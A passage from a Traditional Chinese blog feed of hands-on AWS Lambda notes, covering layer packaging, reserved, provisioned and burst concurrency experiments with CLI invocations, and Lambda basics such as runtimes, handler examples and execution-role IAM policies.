Lambda 層（Layer）"></a>什麼是 Lambda 層（Layer）</h2><p>在 Lambda 中， Layer 是用來存放dependency 或者是模組用的zip 壓縮檔。不同的 Lambda 函數也可以通過 layer 來去共享資料。</p><p>一旦你為你的 Lambda 函數新增一個 Layer，<strong>Lambda 就會去將你 layer當中的資料放到 Lambda 執行環境中的 <code>/opt</code> 目錄底下</strong>。</p><p><img src="https://hackmd.io/_uploads/H1a_iXvk6.png"></p><blockquote><p>注意： 每個函數最多只能包含5個 Layer </p></blockquote><h2 id="打包模組到-Layer"><a href="#打包模組到-Layer" class="headerlink" title="打包模組到 Layer"></a>打包模組到 Layer</h2><p>每個 Layer 當中的模組，隨著你使用 Runtime 的不同，打包 zip檔時會需要遵循不同的檔案結構 [1]。</p><p>以 Python 來說 檔案結構可以是:</p><ul><li><code>/opt/python</code></li><li><code>/opt/python/lib/python3.x/site-packages </code></li></ul><p>而所有 Runtime 都支援以下兩種額外的目錄：</p><ul><li><code>/bin (PATH)</code></li><li><code>/lib (LD_LIBRARY_PATH)</code></li></ul><p>現在我們就來為 requests 打包成壓縮檔吧</p><ol><li>本機封裝層內容，請執行下面的指令，若您的套件安裝工具是 pip3 則將指令開頭替換成 pip3</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install requests --target=./python </span><br></pre></td></tr></table></figure><p>這會在你本地當中建立 python&#x2F; 目錄，並將所需的模組下載到目錄中，請注意這裡的目錄名稱需要與 Runtime 所使用的語言匹配。</p><ol start="2"><li><p>打包目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip -r layer.zip python/</span><br></pre></td></tr></table></figure><p>去將 python 目錄底下的所有檔案打包至一個 zip檔</p></li><li><p>在Lambda 主控台中，左側導覽區域中有個 <strong>layer</strong>，點選後會跳轉至layer頁面，可以在頁面中選擇新增新的layer</p></li></ol><p><img src="https://hackmd.io/_uploads/SyjslEwya.png"></p><p>為Layer 取名並且在頁面中上傳剛才建立的 <code>layer.zip</code>，接著選擇 Runtime 以及架構後就可以建立Layer了。</p><p><img src="https://hackmd.io/_uploads/HkELWNPJa.png"></p><p>完成後就回到 Lambda 主頁去新增 Layer</p><p><img src="https://hackmd.io/_uploads/HkbdbNvyp.png"></p><p>新增 Layer 的頁面中選擇 Custom Layer，就可以看到剛剛建立的 Layer了。</p><p><img src="https://hackmd.io/_uploads/S1esbVwJp.png"></p><h2 id="測試"><a href="#測試" class="headerlink" title="測試"></a>測試</h2><p>這時再度從主控台按下測試，就不會報錯了</p><p><img src="https://hackmd.io/_uploads/rkNaf4v16.png"></p><p>或者通過 AWS CLI 去調用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">aws lambda invoke \</span><br><span class="line">    --cli-binary-format raw-in-base64-out \</span><br><span class="line">    --function-name ITHomeLambdaFunction \</span><br><span class="line">    --payload &#x27;&#123; &quot;Test&quot;: &quot;ITHome&quot; &#125;&#x27; \</span><br><span class="line">    response.json</span><br></pre></td></tr></table></figure><p><img src="https://hackmd.io/_uploads/HkRKONw1a.png"></p><p>去看 CloudWatch 也能收到資料</p><blockquote><p>雖然把吐回來的東西拆成一個一個log entry 很怪XD</p></blockquote><p><img src="https://hackmd.io/_uploads/ryK-tEvkp.png"></p><h2 id="參考資料"><a href="#參考資料" class="headerlink" title="參考資料"></a>參考資料</h2><p>[1] <a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/packaging-layers.html#packaging-layers-paths">每個 Lambda 執行時間的層路徑</a></p>]]></content>
      
      
      <categories>
          
          <category> 實作紀錄 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWS </tag>
            
            <tag> Lambda </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AWS Lambda知識整理 | 佈建並行 | 預留並行</title>
      <link href="/posts/a09fae.html"/>
      <url>/posts/a09fae.html</url>
      
        <content type="html"><![CDATA[<h2 id="回顧"><a href="#回顧" class="headerlink" title="回顧"></a>回顧</h2><p>前面有提及了 Lambda 的基本介紹、Lambda Runtime、權限配置 以及從日誌上觀察初始化時間以及函數執行時間。</p><p>最後我們有提到一個問題，那就是</p><blockquote><p>如果我們用 AWS CLI 去調用 Lambda 函數，用 Terminal 一次開三個Tab同時調用我們的 Lambda 函數會發生什麼事？</p></blockquote><h2 id="實驗一-設置-Reserved-Concurrency"><a href="#實驗一-設置-Reserved-Concurrency" class="headerlink" title="實驗一 - 設置 Reserved Concurrency"></a>實驗一 - 設置 Reserved Concurrency</h2><p>我們執行以下指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">aws lambda invoke \</span><br><span class="line">    --function-name TestInvocations \</span><br><span class="line">    --cli-binary-format raw-in-base64-out \</span><br><span class="line">    --payload &#x27;&#123; &quot;name&quot;: &quot;test&quot; &#125;&#x27; \</span><br><span class="line">    response.json</span><br></pre></td></tr></table></figure><p><img src="https://hackmd.io/_uploads/ry_jkJsRn.png"></p><p>事實上他都可以成功，並且會在 CloudWatch 上產生三筆Log Stream。 </p><p><img src="https://hackmd.io/_uploads/SJ64-1iCn.png"></p><p>但如果我們去設定動一點手腳，我們將某個叫做 <strong>Reserved Concurrency</strong> 的設定調整成1，並按下 saved。並且重新透過 CLI 執行調用的指令，看會發生什麼事。</p><p><img src="https://hackmd.io/_uploads/Sk6GZJsCn.png"></p><p>這時候會發現，只有一個請求成功回傳200，其他都被 Throttled。會回傳 <code>TooManyRequestsException</code> 的錯誤訓息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">An error occurred (TooManyRequestsException) when calling the Invoke operation</span><br></pre></td></tr></table></figure><p>這必須提到 Lambda 應對同時間大量請求的處理機制。</p><blockquote><p>首先，什麼是 Reserved Concurrency? 什麼又是 Unresereved Concurrency?</p></blockquote><h2 id="預留並行-Reserved-Concurrency"><a href="#預留並行-Reserved-Concurrency" class="headerlink" title="預留並行(Reserved Concurrency)"></a>預留並行(Reserved Concurrency)</h2><p>談到 Concurrency，中文叫做並行或併發。這代表什麼？這代表同一時間的多個請求。為了應對這同時來臨的請求，Lambda 函數會去自動擴展。 Serverless 到好處就是，你不需要考量該如何為 Lambda 設置擴展，像是怎麼設定 auto-scaling 的功能。</p><p>在 Lambda 當中，對於同一個函數，使用者只需要考量「<strong>對於這個Lambda 函數，你會需要隨時為它保留多少數量的執行個體？</strong></p><p>這時，你就可以考慮為你的函數設定 Reserved Concurrency。</p><p>預留並行是要分配給函數的並行執行個體數量上限。當某個函數具有預留並行時，其他函數都無法使用該並行。</p><p><strong>如果你在 Lambda 主控台上設定 Reserved Concurrency為 1，就會從 Unreserved Concurrency 當中扣除掉 1</strong>。</p><p>而這個設定是區域型的限制 (Regional)，若你為某個函數設定Resevered Concurrecny 為 100 那剩下的 900 就會是由區域內其他函數共用。</p><blockquote><p>可以為一個函數保留多少數量的 Concurrency?</p></blockquote><p>答案會是， <code>UnreservedConcurrency - 100</code> 數量的並行。<br>也就是說一個函數不可以獨佔所有的並行僅為這個函數來執行，起碼會留下 100 個並行數量給其他函數共用。</p><blockquote><p>你要如何決定你的函數改保留多少並行？</p></blockquote><p>你可以透鍋觀察 CloudWatch 指標 <code>ConcurrentExecutions</code> 來決定 [1]。 這個指標可以觀察到對於你的函數而言，一天下來不同時間段的並行請求數量，假設這個函數一天一次最多會有 30個請求進來，並且這個函數對你很重要，那就可以考慮保留 30 個 Lambda 執行個體來處理請求。</p><blockquote><p>另外值得一提的是，設定函數的預留並行不會收費</p></blockquote><h2 id="佈建並行-（Provision-Conccurency）"><a href="#佈建並行-（Provision-Conccurency）" class="headerlink" title="佈建並行 （Provision Conccurency）"></a>佈建並行 （Provision Conccurency）</h2><p>可能會有人好奇，如果函數會根據請求擴展，那啟動新的執行環境，這樣對於 time-sensitive 的請求來說，延遲不會很久嗎？</p><p><img src="https://hackmd.io/_uploads/ByoYHrrkp.png"></p><blockquote><p>圖片來源： AWS 官網</p></blockquote><p>這個想法沒錯，可以看到上圖的數字4，就是這樣的狀況。</p><p>這代表 3 個執行環境在處理 3 個請求，但第4個請求出來時，就必須初始化一個新的 Lambda 執行環境。 這樣就勢必有延遲，需要等待 Runtime 啟動，下載 Lambda code 和 dependency，以及去執行 Handler 以外的程式區塊（如果有的話）。</p><p>佈建並行的意義在於 <strong>「為函數預先初始化多個環境執行個體，有助於縮短冷啟動延遲」</strong></p><p><strong>冷啟動延遲 （Cold Start）</strong> 就是 Lambda 執行環境在啟動載入時，這段不可控的延遲時間（不包含 Function Init, 也就是執行 handler 程式外區段的初始化時間）。這部分我們會在後面提到。</p><p>回到 Provision Concurrency，所以如果設定了 Provision Concurrency，圖片比較會類似下面。</p><p>假設 Provision Concurrency 設成4。 那一開始就會有四個 Lambda 執行環境進行初始化。並且後續的請求都會重用那四個 Lambda 環境，也就是說當這裡就保證了一定會有 4個初始化過的 Lambda 環境存在，對於時間敏感度高的請求，就比較適合設定這個功能，才不用再度收到初始化的延遲影響。</p><p><img src="https://hackmd.io/_uploads/rJ1GiHSJT.png"></p><p>那要怎麼設定 Provision Concurrency 呢？[2]</p><blockquote><p>提醒：為函數設定 Provision Concurrency 是要收費的</p></blockquote><h2 id="實驗二-設置-Provision-Concurrency"><a href="#實驗二-設置-Provision-Concurrency" class="headerlink" title="實驗二 - 設置 Provision Concurrency"></a>實驗二 - 設置 Provision Concurrency</h2><p>在設定 Provision Concurrency之前有個前置作業要做，也就是<strong>發布你的函數版本</strong>。</p><p>每個函數在發布版本之前的預設都是： <strong>$LATEST</strong>，但 Provision Concurrency 並不能設定在 $LATEST 版本的函數上面，這是一個限制。</p><p>可以先在主頁中的 <strong>Version</strong> 找到 <strong>Publish new version</strong><br><img src="https://hackmd.io/_uploads/H1khZIrya.png"></p><p>接著可以填入這個版本的敘述，然後按下 Publish<br><img src="https://hackmd.io/_uploads/By2C-UH1T.png"></p><p>之後就會調轉到 Version 1 的 Lambda函數主控台 （與 $LATEST 函數主控台略微不同）。這時應該會看到 Provision Concurrency 的設定畫面，點選後就可以為 Version 1 的函數設定並行。</p><p><img src="https://hackmd.io/_uploads/Bk4KM8r1T.png"></p><p>下方可以填入你想要維持 warm start 狀態的 Lambda 並行數量。<br>底下可以注意到 “10 available”。這個數字是哪來的呢？</p><p>其實這個數字就是你函數的 <strong>Reserved Concurrency 的數量</strong></p><p>可以回到 $LATEST 版本的函數主控台畫面。</p><p><img src="https://hackmd.io/_uploads/SJMrmLSyp.png"></p><p>底下可以看到我們設定數量就是 10。<br><img src="https://hackmd.io/_uploads/B1OLmIBJp.png"></p><blockquote><p><strong>因此我們可以設定佈建並行的數量，是取決於你為該函數設定的保留並行數量</strong></p></blockquote><p>我們這裡將佈建並行數量設定成 5。</p><p><img src="https://hackmd.io/_uploads/SkPZV8S1T.png"></p><p>之後會需要點時間來建立並行。</p><p>接著我們來測試設定的 Provision Concurrency。</p><p>首先，以下是測試用的 code (在version1 函數當中的程式碼)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json, time</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lambda_handler</span>(<span class="params">event, context</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;sleep for 3 secs&quot;</span>)</span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="string">&#x27;statusCode&#x27;</span>: <span class="number">200</span>,</span><br><span class="line">        <span class="string">&#x27;body&#x27;</span>: json.dumps(<span class="string">&#x27;Hello from Lambda!&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我們通過 AWS CLI 來去觸發 Lambda 函數</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">aws lambda invoke \</span><br><span class="line">--function-name TestInvocations \</span><br><span class="line">--cli-binary-format raw-in-base64-out \</span><br><span class="line">--qualifier 1 \</span><br><span class="line">--payload &#x27;&#123; &quot;key&quot;: &quot;value&quot; &#125;&#x27; </span><br><span class="line">response.json</span><br></pre></td></tr></table></figure><p>在 <code>--qualifier</code> 參數後面接的是版本名稱或者是 Alias 名稱。</p><p>可以先暫停，在實際觸發錢先去觀察 CloudWatch 上的觸發日誌</p><p><img src="https://hackmd.io/_uploads/ryTU7dBJ6.png"></p><p>會發現有多個執行環境已經先預熱完成了</p><blockquote><p>至於數量為何大於 Provision Concurrency 數量這點尚未確定<br>可能是為了可用性？</p></blockquote><p>在開多個終端送請求後，可以發現一樣，因為執行環境已經預熱好，因此不需要重新 Init，可以基於 Container-Reuse 的特性來在現有的執行環境執行請求。</p><p><img src="https://hackmd.io/_uploads/rkdt4urya.png"></p><h2 id="Reserved-Concurrency-vs-Provison-Concurrency"><a href="#Reserved-Concurrency-vs-Provison-Concurrency" class="headerlink" title="Reserved Concurrency vs. Provison Concurrency"></a>Reserved Concurrency vs. Provison Concurrency</h2><p><img src="https://hackmd.io/_uploads/B1BXrdB1a.png"></p><blockquote><p>圖片來源： <a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/lambda-concurrency.html#reserved-and-provisioned">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/lambda-concurrency.html#reserved-and-provisioned</a></p></blockquote><p>用官方展示一張對比圖來解釋這兩種並行的差異。</p><p>以下是我整理這兩種並行的差異</p><table><thead><tr><th></th><th>RC(Reserved Concurrency)</th><th>PC(Provision Concurrency)</th></tr></thead><tbody><tr><td>費用:</td><td>不用收費</td><td>要收費</td></tr><tr><td>特性：</td><td>確保一定數量的Lambda執行環境存在</td><td>確保一定數量的Lambda執行環境存在且這當中有一定數量的執行環境已經初始化過了</td></tr><tr><td>達到limit的反應</td><td>Throtteld <code>TooManyRequest</code></td><td>若還有RC額度，則會擴增執行環境個數，但一樣會有冷啟動，沒有額度則 Throttled</td></tr></tbody></table><blockquote><p>也請參考官方的差異表格 [3]</p></blockquote><h2 id="暴增並行"><a href="#暴增並行" class="headerlink" title="暴增並行"></a>暴增並行</h2><p>所謂的暴增並行（Burst Concurrency），目的也是為了能夠應付突然暴增的請求。</p><p>但面對突然增加的大量請求，Lambda 可能也沒辦法立即擴展來處理，這是為了防止 Lambda 函數過度擴展消耗太多資源。</p><p>所以在因應函數暴增的速度，可以通過設定暴增並行來去增加建立 Lambda 執行環境的最高速度。而這個設定是 Account-Level 的設定。</p><p>但在不同 Region，暴增並行有上限的差異：</p><ul><li><code>us-west-2</code>, <code>us-east-1</code> 以及 <code>eu-west-1</code>的 Region 基本上是上限都是 3000</li><li><code>ap-northeast-1</code>, <code>eu-central-1</code> 還有 <code>us-east-2</code> Region 上限是 1000</li><li>其他 Region 都是 500</li></ul><p>以 us-east-1 為例，暴增並行每分鐘擴展 500 個單位的暴增擴展（額外的 Lambda 執行環境），直到達到需求或者是達到上限 3000個。</p><p>超出上限的請求會被 Throttled (Status Code: 429)</p><p>有興趣的可以直接看官方文件針對暴增並行的介紹 [5]。</p><h2 id="冷啟動-（Cold-Start）"><a href="#冷啟動-（Cold-Start）" class="headerlink" title="冷啟動 （Cold Start）"></a>冷啟動 （Cold Start）</h2><blockquote><p>Lambda 在 Init 階段做了哪些事情</p></blockquote><ul><li>當 Lambda 服務透過 Lambda API 收到啟動 Lambda 函數的請求時服務本身會去下載函數程式碼。</li><li>這個程式碼會存放在 Lambda 內部的 S3 bucket當中</li><li>如果是用函數是用容器建立，則函數程式碼會放在 <strong>Amazon ECR</strong> 上</li><li>接著會去建立具有指定記憶體大小以及指定 Runtime 的環境 </li><li>接著會去執行 函數 Hander之外的初始化程式</li></ul><p>根據 [4]，可以知道上面的步驟除了執行函數初始化程式外，都屬於 Cold Start 的範圍。而執行函數 handler 外的程式碼就算是 warm start，也就是我們可以控制的範圍了。</p><blockquote><p>函數又是怎麼能夠一直保持是 “warm”的？</p></blockquote><p>官方文件說明是通過一種 <strong>pinging mechanism</strong>。主要實踐方式是透過設定 <strong>Eventbridge</strong> 的規則安排每分鐘調用一次函數來幫助函數執行環境保持活躍，</p><p>減緩冷啟動的方式，目前推薦的還是藉由設定 Provision Concurrency。<br>另外還有 <strong>Snapstart</strong>，這個我們可以留到後面繼續介紹～</p><h2 id="參考文件"><a href="#參考文件" class="headerlink" title="參考文件"></a>參考文件</h2><p>[1] <a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/configuration-concurrency.html#estimating-reserved-concurrency">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/configuration-concurrency.html#estimating-reserved-concurrency</a><br>[2] <a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/provisioned-concurrency.html">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/provisioned-concurrency.html</a><br>[3] <a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/lambda-concurrency.html#comparing-reserved-provisioned">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/lambda-concurrency.html#comparing-reserved-provisioned</a><br>[4] <a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/operatorguide/execution-environments.html#cold-start-latency">https://docs.aws.amazon.com/zh_tw/lambda/latest/operatorguide/execution-environments.html#cold-start-latency</a><br>[5]<a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/burst-concurrency.html">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/burst-concurrency.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 實作紀錄 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWS </tag>
            
            <tag> Lambda </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Lambda 基本認識 feat.容器重用小實驗</title>
      <link href="/posts/c79cef2b.html"/>
      <url>/posts/c79cef2b.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>首先，為什麼談到無伺服器總是會有人提到 Lambda ?</p><p>以下就開始來介紹這個服務</p><h2 id="FaaS-Function-as-a-Service"><a href="#FaaS-Function-as-a-Service" class="headerlink" title="FaaS (Function as a Service)"></a>FaaS (Function as a Service)</h2><p>一旦談到無伺服器運算，就會提到他的核心概念，<strong>功能即服務(Function as a Service)</strong> ，這裡引用維基百科對於 FaaS 的解釋</p><blockquote><p>FaaS 是雲端運算的一種模型。以平台即服務（PaaS）為基礎，無伺服器運算提供一個微型的架構，終端客戶不需要部署、配置或管理伺服器服務，程式碼運行所需要的伺服器服務皆由雲端平台來提供。</p></blockquote><p>沒錯，這個概念的核心就是讓使用者專注在設計產品或業務邏輯，而不需費心在部署配置或是設定伺服器。</p><p>而最早實踐這個概念並推出服務的，就是 AWS 在 2014 年推出的 Lambda 服務。（當然後續也有 Microsoft 的 Azure Function）</p><h2 id="Lambda-函數"><a href="#Lambda-函數" class="headerlink" title="Lambda 函數"></a>Lambda 函數</h2><blockquote><p>Lambda 在高可用性的運算基礎設施上執行您的程式碼，並執行所有運算資源的管理，包括伺服器與作業系統維護、容量佈建與自動擴展以及記錄。使用 Lambda，您唯一需要做的就是在 Lambda 支援的其中一種語言執行期中提供您的程式碼 [1]。[name&#x3D;AWS Documents] </p></blockquote><p>以行為上來看基本上就是，我底下的這張圖。會有某個上游的觸發器（Trigger），通常是某種服務來去調用 Lambda 函數，或者是手動透過AWS CLI 的方式調用。 Lambda 執行函數完畢後將執行結果回傳給原服務，並且可以將觸發下游的目的地（ Destination）這通常也是某個服務。</p><p><img src="https://hackmd.io/_uploads/SyPe6nOC2.png"></p><p>現在假設你是一個新手，剛接觸 Lambda 你可能會急著想要打開你的 Console ，用範例程式，或者有些人範例程式寫什麼都不看就刪掉，直接複製貼上本地程式，然後透過預設的 Event 來去測試你的 Lambda 函數，然後發現跑不動….</p><p>請別急，在動手前最好先有 Lambda Runtime 以及 Lambda 程式的概念。</p><h2 id="基本規格"><a href="#基本規格" class="headerlink" title="基本規格"></a>基本規格</h2><ul><li>RAM</li><li>Storage</li></ul><h3 id="設置-RAM"><a href="#設置-RAM" class="headerlink" title="設置 - RAM"></a>設置 - RAM</h3><p>RAM 與 CPU 處理效能成正比，可以透過提升 RAM 來連帶提升CPU處理速度<br>    128MB to 3008MB</p><blockquote><p>參考來源:<br><a href="https://koding.work/aws-lambda-performance-is-related-to-memory-size/">https://koding.work/aws-lambda-performance-is-related-to-memory-size/</a></p></blockquote><h2 id="Lambda-Runtimes"><a href="#Lambda-Runtimes" class="headerlink" title="Lambda Runtimes"></a>Lambda Runtimes</h2><p>Lambda 通過使用 Runtime 來支援多種程式語言開發。每個主要的程式設計語言版本都有獨立的 Runtimes。 而這些 Runtime 提供了基本的程式語言的函式庫以及執行環境。</p><p>主流語言都有官方支援的 Runtime 像是 NodeJS, Python, Java, Go, Ruby 等等，並且也支援你去自定義 Runtime。<a href="https://github.com/awslabs/aws-lambda-cpp">像是 C++ Runtime</a>，官方也有提供 Github 和 Post 去寫怎麼使用這種自定義的 Runtimes [3]</p><blockquote><p>小弟就有自定義過 Perl Runtime，但會需要自寫 images..:(</p></blockquote><p>另外， Lambda Runtime 其實都是基於 Amazon Linux 進行開發的。所以基本上如果有自定義 Runtime 的需求，建議都是開個 t2.micro 的 EC2 (選擇 Amazon Linux 相關的 AMI )再來去建構 Runtime。 </p><h2 id="Lambda-程式設計模型"><a href="#Lambda-程式設計模型" class="headerlink" title="Lambda 程式設計模型"></a>Lambda 程式設計模型</h2><p>Lambda 提供的程式設計模型對於所有 Runtime 通用。程式設計模型會定義一個 Handler 來去處理進來的事件。這個做法其實就是將函數的進入點告知 Lambda。執行時間會將包含呼叫事件和內容的物件傳入至 Handler，例如函數名稱和 Request ID。</p><p>如果你建立不同 Runtime 的 Function，應該會在主控台的程式碼區塊上看到不同語言 Handler。</p><p>Handler (Python)[4]</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def handler_name(event, context): </span><br><span class="line">    ...</span><br><span class="line">    return some_value</span><br></pre></td></tr></table></figure><p>Handler (Java17)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">package example;</span><br><span class="line"></span><br><span class="line">import com.amazonaws.services.lambda.runtime.Context;</span><br><span class="line">import com.amazonaws.services.lambda.runtime.LambdaLogger;</span><br><span class="line">import com.amazonaws.services.lambda.runtime.RequestHandler;</span><br><span class="line"></span><br><span class="line">// Handler value: example.HandlerInteger</span><br><span class="line">public class HandlerIntegerJava17 implements RequestHandler&lt;IntegerRecord, Integer&gt;&#123;</span><br><span class="line"></span><br><span class="line">  @Override</span><br><span class="line">  /*</span><br><span class="line">   * Takes in an InputRecord, which contains two integers and a String.</span><br><span class="line">   * Logs the String, then returns the sum of the two Integers.</span><br><span class="line">   */</span><br><span class="line">  public Integer handleRequest(IntegerRecord event, Context context)</span><br><span class="line">  &#123;</span><br><span class="line">    LambdaLogger logger = context.getLogger();</span><br><span class="line">    logger.log(&quot;String found: &quot; + event.message());</span><br><span class="line">    return event.x() + event.y();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">record IntegerRecord(int x, int y, String message) &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Handler (Go)    </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">    package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">        &quot;fmt&quot;</span><br><span class="line">        &quot;context&quot;</span><br><span class="line">        &quot;github.com/aws/aws-lambda-go/lambda&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">type MyEvent struct &#123;</span><br><span class="line">        Name string `json:&quot;name&quot;`</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func HandleRequest(ctx context.Context, name MyEvent) (string, error) &#123;</span><br><span class="line">        return fmt.Sprintf(&quot;Hello %s!&quot;, name.Name ), nil</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">        lambda.Start(HandleRequest)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>諸如此類。</p><p>另外，由於剛創建 Lambda 的時候僅會有 Lambder-Handler一個檔案，但其實可以存取在 Lambda 執行環境當中的 <code>/tmp</code> 目錄 ，每個執行環境都會在 <code>/tmp</code> 目錄中提供 512 MB 到 10,240 MB 的磁碟空間，增量為 1 MB [5]。具體而言可以等之後談到 Lambda 執行環境的生命週期再說。</p><h2 id="權限"><a href="#權限" class="headerlink" title="權限"></a>權限</h2><p>Lambda 當中主要是透過執行角色（Execution Role）來去代替來源服務去執行操作。</p><p>那什麼是 Lambda 執行角色？</p><blockquote><p>Lambda 函數的執行角色是 AWS IAM 角色，它可授予函數存取 AWS 服務和資源的許可。例如，您可以建立一個執行角色，該角色有權向 Amazon CloudWatch 傳送日誌並向 AWS X-Ray 上傳追蹤資料。本頁提供有關如何建立、檢視和管理 Lambda 函數執行角色的資訊 [6]。</p></blockquote><p>執行角色跟一般角色最大的不同就是，當調用函數時，<strong>Lambda 會透過擔任此角色自動為您的函數提供臨時憑證</strong>。開發者不必在函數程式碼中呼叫 <code>sts:AssumeRole</code></p><p>而需要做到這點的必要設置，就是要設定角色的信任政策(Trust Policy)，這當中就必須將 Lambda 服務指定為受信任的主體</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;Version&quot;: &quot;2012-10-17&quot;,</span><br><span class="line">  &quot;Statement&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;Effect&quot;: &quot;Allow&quot;,</span><br><span class="line">      &quot;Principal&quot;: &#123;</span><br><span class="line">        &quot;Service&quot;: &quot;lambda.amazonaws.com&quot;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;Action&quot;: &quot;sts:AssumeRole&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一旦有了執行角色，就可以去為這個角色附加政策，可以使用 AWS 管理的政策或者是自己定義政策</p><p><img src="https://hackmd.io/_uploads/ryyPLT9Rn.png"></p><p>當然，若你在建立 Lambda 的時候選擇 “Create a new role with basic Lambda permissions”，就會去建立一個帶有 <code>LambdaBasicExecutionRole</code> 的政策。</p><p><img src="https://hackmd.io/_uploads/HkTcIpcCh.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;Version&quot; : &quot;2012-10-17&quot;,</span><br><span class="line">  &quot;Statement&quot; : [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;Effect&quot; : &quot;Allow&quot;,</span><br><span class="line">      &quot;Action&quot; : [</span><br><span class="line">        &quot;logs:CreateLogGroup&quot;,</span><br><span class="line">        &quot;logs:CreateLogStream&quot;,</span><br><span class="line">        &quot;logs:PutLogEvents&quot;</span><br><span class="line">      ],</span><br><span class="line">      &quot;Resource&quot; : &quot;*&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>這個政策基本上就是給予 Lambda 函數能夠建立Log Group 並且能夠在Log Group 中建立 Log 